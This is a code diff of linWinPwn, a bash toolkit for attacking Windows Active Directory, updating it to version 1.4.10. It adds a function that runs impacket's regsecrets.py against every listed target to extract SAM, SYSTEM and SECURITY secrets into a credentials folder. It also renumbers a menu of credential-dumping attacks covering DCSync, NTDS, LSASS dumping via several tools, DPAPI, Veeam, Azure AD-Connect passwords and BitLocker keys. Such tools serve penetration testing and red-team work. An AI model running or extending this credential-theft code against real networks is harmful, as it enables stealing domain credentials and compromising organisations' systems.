@@ -78,6 +78,7 @@ impacket_rpcdump=$(command -v rpcdump.py)
 if ! stat "${impacket_rpcdump}" >/dev/null 2>&1; then impacket_rpcdump=$(command -v impacket-rpcdump); fi
 impacket_reg=$(command -v reg.py)
 if ! stat "${impacket_reg}" >/dev/null 2>&1; then impacket_reg=$(command -v impacket-reg); fi
+impacket_regsecrets=$(command -v regsecrets.py)
 impacket_smbserver=$(command -v smbserver.py)
 if ! stat "${impacket_smbserver}" >/dev/null 2>&1; then impacket_smbserver=$(command -v impacket-smbserver); fi
 impacket_ticketer=$(command -v ticketer.py)
@@ -177,7 +178,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.9 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.10 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -4769,7 +4770,7 @@ secrets_dump() {
     echo -e ""
 }
 
-samsystem_dump() {
+reg_samsystem_dump() {
     if ! stat "${impacket_reg}" >/dev/null 2>&1; then
         echo -e "${RED}[-] reg.py not found! Please verify the installation of impacket${NC}"
     else
@@ -4791,6 +4792,23 @@ samsystem_dump() {
     echo -e ""
 }
 
+regsecrets_dump() {
+    if ! stat "${impacket_regsecrets}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] regsecrets.py not found! Please verify the installation of impacket${NC}"
+    else
+        echo -e "${BLUE}[*] Extraction SAM SYSTEM and SECURITY using regsecrets${NC}"
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] regsecrets requires credentials${NC}"
+        else
+            for i in $(/bin/cat "${curr_targets_list}"); do
+                echo -e "${CYAN}[*] regsecrets save of ${i} ${NC}"
+                mkdir -p "${Credentials_dir}/SAMDump_${user_var}/${i}"
+                run_command "${impacket_regsecrets} ${argument_imp}\\@${i} -dc-ip ${dc_ip}" | tee "${Credentials_dir}/SAMDump_${user_var}/regsecrets_${dc_domain}_${i}.txt"
+            done
+        fi
+    fi
+    echo -e ""
+}
 ntds_dump() {
     echo -e "${BLUE}[*] Dumping NTDS using netexec${NC}"
     if [ "${nullsess_bool}" == true ]; then
@@ -7057,23 +7075,24 @@ pwd_menu() {
         check_tool_status "${impacket_secretsdump}" "DCSync using secretsdump (only on DC)" "3"
         check_tool_status "${impacket_secretsdump}" "Dump SAM and LSA using secretsdump" "4"
         check_tool_status "${impacket_reg}" "Dump SAM and SYSTEM using reg" "5"
-        check_tool_status "${netexec}" "Dump NTDS using netexec" "6"
-        check_tool_status "${netexec}" "Dump SAM and LSA secrets using netexec" "7"
-        check_tool_status "${netexec}" "Dump LSA secrets using netexec" "8"
-        check_tool_status "${netexec}" "Dump SAM and LSA secrets using netexec without touching disk (regdump)" "9"
-        check_tool_status "${netexec}" "Dump LSASS using lsassy" "10"
-        check_tool_status "${netexec}" "Dump LSASS using handlekatz" "11"
-        check_tool_status "${netexec}" "Dump LSASS using procdump" "12"
-        check_tool_status "${netexec}" "Dump LSASS using nanodump" "13"
-        check_tool_status "${netexec}" "Dump dpapi secrets using netexec" "14"
-        check_tool_status "${donpapi}" "Dump secrets using DonPAPI" "15"
-        check_tool_status "${donpapi}" "Dump secrets using DonPAPI (Disable Remote Ops operations)" "16"
-        check_tool_status "${hekatomb}" "Dump secrets using hekatomb (only on DC)" "17"
-        check_tool_status "${netexec}" "Search for juicy information using netexec" "18"
-        check_tool_status "${netexec}" "Dump Veeam credentials (only from Veeam server)" "19"
-        check_tool_status "${netexec}" "Dump Msol password (only from Azure AD-Connect server)" "20"
-        check_tool_status "${ExtractBitlockerKeys}" "Extract Bitlocker Keys" "21"
-        check_tool_status "${netexec}" "Dump SAM and LSA secrets using winrm with netexec" "22"
+        check_tool_status "${impacket_regsecrets}" "Dump SAM and SYSTEM using regsecrets" "6"
+        check_tool_status "${netexec}" "Dump NTDS using netexec" "7"
+        check_tool_status "${netexec}" "Dump SAM and LSA secrets using netexec" "8"
+        check_tool_status "${netexec}" "Dump LSA secrets using netexec" "9"
+        check_tool_status "${netexec}" "Dump SAM and LSA secrets using netexec without touching disk (regdump)" "10"
+        check_tool_status "${netexec}" "Dump LSASS using lsassy" "11"
+        check_tool_status "${netexec}" "Dump LSASS using handlekatz" "12"
+        check_tool_status "${netexec}" "Dump LSASS using procdump" "13"
+        check_tool_status "${netexec}" "Dump LSASS using nanodump" "14"
+        check_tool_status "${netexec}" "Dump dpapi secrets using netexec" "15"
+        check_tool_status "${donpapi}" "Dump secrets using DonPAPI" "16"
+        check_tool_status "${donpapi}" "Dump secrets using DonPAPI (Disable Remote Ops operations)" "17"
+        check_tool_status "${hekatomb}" "Dump secrets using hekatomb (only on DC)" "18"
+        check_tool_status "${netexec}" "Search for juicy information using netexec" "19"
+        check_tool_status "${netexec}" "Dump Veeam credentials (only from Veeam server)" "20"
+        check_tool_status "${netexec}" "Dump Msol password (only from Azure AD-Connect server)" "21"
+        check_tool_status "${ExtractBitlockerKeys}" "Extract Bitlocker Keys" "22"
+        check_tool_status "${netexec}" "Dump SAM and LSA secrets using winrm with netexec" "23"
     fi
     echo -e "back) Go back"
     echo -e "exit) Exit"
@@ -7112,91 +7131,96 @@ pwd_menu() {
         ;;
 
     5)
-        samsystem_dump
+        reg_samsystem_dump
         pwd_menu
         ;;
 
     6)
-        ntds_dump
+        regsecrets_dump
         pwd_menu
         ;;
 
     7)
-        samlsa_dump
+        ntds_dump
         pwd_menu
         ;;
 
     8)
-        lsa_dump
+        samlsa_dump
         pwd_menu
         ;;
 
     9)
-        samlsa_reg_dump
+        lsa_dump
         pwd_menu
         ;;
 
     10)
-        lsassy_dump
+        samlsa_reg_dump
         pwd_menu
         ;;
 
     11)
-        handlekatz_dump
+        lsassy_dump
         pwd_menu
         ;;
 
     12)
-        procdump_dump
+        handlekatz_dump
         pwd_menu
         ;;
 
     13)
-        nanodump_dump
+        procdump_dump
         pwd_menu
         ;;
 
     14)
-        dpapi_dump
+        nanodump_dump
         pwd_menu
         ;;
 
     15)
-        donpapi_dump
+        dpapi_dump
         pwd_menu
         ;;
 
     16)
-        donpapi_noreg_dump
+        donpapi_dump
         pwd_menu
         ;;
 
     17)
-        hekatomb_dump
+        donpapi_noreg_dump
         pwd_menu
         ;;
 
     18)
-        juicycreds_dump
+        hekatomb_dump
         pwd_menu
         ;;
 
     19)
-        veeam_dump
+        juicycreds_dump
         pwd_menu
         ;;
 
     20)
-        msol_dump
+        veeam_dump
         pwd_menu
         ;;
 
     21)
-        bitlocker_dump
+        msol_dump
         pwd_menu
         ;;
 
     22)
+        bitlocker_dump
+        pwd_menu
+        ;;
+
+    23)
         winrm_dump
         pwd_menu
         ;;
